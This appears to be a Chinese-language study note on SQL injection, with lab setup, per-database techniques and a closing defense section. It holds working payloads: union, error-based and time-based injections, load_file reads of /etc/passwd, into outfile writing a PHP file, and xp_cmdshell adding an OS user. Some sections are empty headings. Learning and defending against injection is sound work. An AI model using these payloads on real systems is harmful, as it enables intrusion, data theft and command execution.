## 概述
程序对用户输入检查不严格，用户可以提交一段数据库查询代码，根据程序返回的结果，获得想要的某些信息。
### 分类
* 数据类型分类

```
数字型
字符型
```


* 服务器返回分类

```
union注入
报错注入
盲注
```

### 危害

## 学习环境
### sqli-labs
[sqli-lbas](https://github.com/Audi-1/sqli-labs)

* 安装

```
# 操作系统：Centos7

# LAMP环境
yum install httpd.x86_64 -y
yum install mariadb-libs.x86_64 mariadb-server.x86_64 mariadb.x86_64 -y
yum install php.x86_64 php-mysql.x86_64 -y

# 配置数据库

# 下载到网站目录
git clone https://github.com/Audi-1/sqli-labs.git

# 修改配置文件
vim sqli-labs/sql-connections/db-creds.inc
	# 配置好账号密码就好了
```

* 通关文档

### DVWA
[dvaw](https://github.com/ethicalhack3r/DVWA)

* 安装

```
# 与sqli-lab环境一致，不过需要额外配置几个php模块
```

* 通关文档

## 不同数据库注入技巧
### MySQL
* 获取数据

注释符

```
#：注释从#符号到行尾
--：注释从--符号到行尾
/* */：注释符号中间
```

获取元数据

```
# 查询用户数据库名称
select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA limit 0,1;

# 查询当前表
select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=(select DATABASE()) limit 0,1;

# 查询表中的字段
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME="table_name" limit 0,1; 
```

union查询

```
select username,password from bloodzer0 union select 1,2;
```

MySQL报错注入

```
# 利用错误信息
select convert((select @@version),signed);

# updatexml函数
select * from bloodzer0 where id=1 and updatexml(1,(concat(0x7c,(select @@user()))),1);

# extractvalue函数
select * from bloodzer0 where id=1 and extractvalue(1,concat(0x7c,(select user())));

# 通过floor函数(也就是常说的双查询注入)
select * from bloodzer0 where id=1 union select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b;
```

* MySQL函数

```
# load_file()函数读文件
select 1,load_file('/etc/passwd'),3;
select 1,load_file(0x2f6574632f706173737764),3;
select hex(load_file(char(47,101,99,116,47,112,97,115,115,119,100))),3;

# into outfile函数写文件
select '<?php phpinfo();?>' into outfile '/var/www/html/info.php';
select char(99,58,92,50,46,116,120,116) into outfile '/var/www/html/info.php';

# 连接字符串
select * from bloodzer0 where id=1 union select concat(user(),',',database());

select * from bloodzer0 where id=1 union select concat_ws(0x2c,user(),database());
```

函数						|		说明
---							|		---	
length						|	返回字符串长度
substring					|	截取字符串长度
ascii						|	返回acsii码
hex							|	把字符串转换为16进制
unhex						|	hex的反向操作
now							|	当前系统时间
floor(x)					|	返回不大于X的最大整数值
md5							|	返回MD5值
group_concat				|	返回带有来自一个组的连接的非NULL值的字符串结果
@@datadir					|	读取数据库路径
@@basedir					|	MySQL安装路径
@@version_compile_os	|	操作系统
user						|	用户名
current_user				|	当前用户名
system_user				|	系统用户名
database					|	数据库名
version					|	MySQL数据库版本

* MySQL宽字节注入

```
成因：编码不统一造成，一般只出现在PHP+MySQL中；
magic_quotes_gps=On

编码：%d5
```

* MySQL长字符截断

MySQL版本=5.1 并且 sql_mode=default

MySQL对于插入超过原本限制长度的值只会提示warning，而不是error，出现在web漏洞中的覆盖注册中。

* MySQL盲注

```
# 基于时间
select * from users where id=1 and sleep(3);
select * from users where id=1 and if(length(user())=0,sleep(3),1);
select * from users where id=1 and if(hex(mid(users(),1,1))=1,sleep(3),1);
```

### MSSQL
* 获取数据

利用错误消息提取信息

```
# 枚举表与列
select * from users where username='root' and password='root' having 1=1 --';
select * from users where username='root' and password='root' group by users.id having 1=1 --';

# 利用数据类型转换提取数据
select * from users where username='root' and password='root' and 1>(select top 1 username from users);
select * from users where username='root' and password='root' and 1=conver(int,(select top 1 users.username from users));
```

获取元数据

```
# 获取表信息
select table_name from information_schema.tables;

# 获取字段信息
select column_name from information_schema.columns where table_name='users';
```

数据库视图						|	说明		
---								|	---
sys.database					|	SQL Server中的所有数据库
sys.sql_logins				|	SQL Server中的所有登录名
information_schema.tables	|	当前用户数据库中的表
information_schema.columns	|	当前用户数据库中的列
sys.all_columns				|	用户定义对象和系统对象的所有列的联合
sys.database_principals		|	数据库中每个权限或列异常权限
sys.database_files			|	存储在数据库中的数据库文件
sysobjects					|	数据库中创建的每个对象

order by子句

```
# 测试字段
select id,username,password from users where id=1 order by num;
```

union查询

```
select id,username,password from users where id=1 union select 1,2,3;
select id,username,password from users where id=1 union select user from users;
```

* MSSQL函数

函数								|	说明
---									|	---
select suser_name()				|	返回用户的登录标识名
select user_name()				|	基于指定的标识号返回数据库用户名
select db_name()					|	返回数据库名称
select is_member('db_owner')	|	是否为数据库角色
select convert(int,'5')			|	数据库类型转换
stuff								|	字符串截取函数
ascii								|	取ascii码
char								|	根据ascii码取字符
getdate							|	返回日期
count								|	返回组中的总条数
cast								|	将一种数据类型的表达式显式转换为另一种数据类型的表达式
rand								|	返回随机值
is_srvrolemember					|	指示SQL Server登录名是否为指定服务器角色的成员

* MSSQL存储过程

```
select * from users where id=1; exec xp_cmdshell 'net user hacker hacker /add';
```

存储过程				|	说明
---						|	---
sp_addlogin			|	创建新的SQL Server登录，该登录允许用户使用SQL Server身份验证连接到SQL Server实例
sp_dropuser			|	从当前数据库删除数据库用户
xp_enumgroups			|	提供Microsoft Windows本地组列表或在指定的Windows域中定义全局组列表
xp_regwrite			|	未被公布的存储过程，写入注册表
xp_regread			|	读取注册表
xp_regdeletevalue	|	删除注册表
xp_dirtree			|	读取目录
sp_password			|	更改密码
xp_servicecontrol	|	停止或激活某服务

* 动态执行
exec函数

### Oracle
* 获取数据

获取元数据

```
# 查看表空间
select tablespace_name from user_tablespaces;

# 查看所有表
select table_name from user_tables where rownum=1;

# 查看所有列
select column_name from user_tab_columns where table_name='tab_name';

# 查看所有用户
select username from all_users;
```

union查询

```
union select null,null,null from dual
```

* Oracle包

### PostgreSQL

### MongoDB

## SQL注入Bypass

## SQL注入防御之道
### 输入过滤
不是根本解决办法，可能被绕过；

采用OWASP ESAPI针对输入数据进行过滤；

### 检查数据类型

### 使用安全函数

### 使用预编译
防御SQL注入最佳的方式就是使用预编译语句，绑定变量；

### 使用安全的存储过程
与预编译的区别：存储过程需要先将SQL语句定义在数据库中；

存储过程存在被绕过的可能性：动态的SQL，如：xp_cmdshell

### 使用框架技术
* MyBatis

* Hibernate
